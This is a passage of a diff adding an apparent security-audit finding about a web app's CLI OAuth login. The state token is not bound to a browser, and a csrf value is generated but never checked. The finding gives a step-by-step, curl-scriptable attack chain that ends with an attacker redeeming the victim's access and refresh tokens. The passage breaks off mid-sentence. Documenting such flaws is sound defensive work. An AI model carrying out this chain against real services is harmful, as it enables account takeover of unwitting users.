+      "evidence": "The web flow binds `state` to a browser via a double-submit cookie (`oauth-state.ts`), but the CLI flow does not: `createState()` stores `{mode, port, nonce, challenge}` server-side and returns an opaque token that is accepted on the callback with **no** cookie/browser check (`auth.controller.ts:167` — `consumeState(stateToken)` then straight to `createCode(user.id, state.challenge)`). The `csrf` field that would have provided that binding is generated (`cli-auth.store.ts:47`), returned, and never verified anywhere (grep: only tests reference it).\n\nAttack, fully scriptable with curl and no victim interaction beyond one navigation:\n1. Attacker runs, from their own machine: `GET /auth/github?mode=cli&port=<attacker port>&nonce=<attacker nonce>&challenge=<sha256(attacker verifier)>`. The middleware answers with the confirm page; the attacker reads the `Set-Cookie` secret and the `?confirm=` in the Continue href out of *their own* response (cli-login-confirm.middleware.ts:106-113).\n2. Attacker replays the Continue URL with that cookie. `GitHubAuthGuard.canActivate` sees `__cliConfirmed` and mints a CLI state token; passport 302s to GitHub, and the attacker reads `state=<TOKEN>` (and `client_id`) straight out of the `Location` header.\n3. Attacker top-level-navigates the victim to `https://github.com/login/oauth/authorize?client_id=<app>&scope=user:email&state=<TOKEN>`. Because the victim already authorised the app, GitHub auto-redirects to `/auth/github/callback?code=<VICTIM code>&state=<TOKEN>` with no prompt and no confirm page.\n4. The callback takes the `else` branch, consumes the attacker's state, and mints an authorization code **for the victim's user id** bound to the **attacker's** PKCE challenge, then redirects to `http://127.0.0.1:<attacker port>/callback?code=…&state=<attacker nonce>` (auth.controller.ts:185-195).\n\nThe attacker holds the matching verifier, so whatever receives that loopback hit can redeem access **and** refresh JWTs for the victim at `POST /aut",
+      "lens": "security",
+      "round_commit": "33714d973424dcea85aa72ac2eb424778bc2426d"
+    }
+  ]
+}
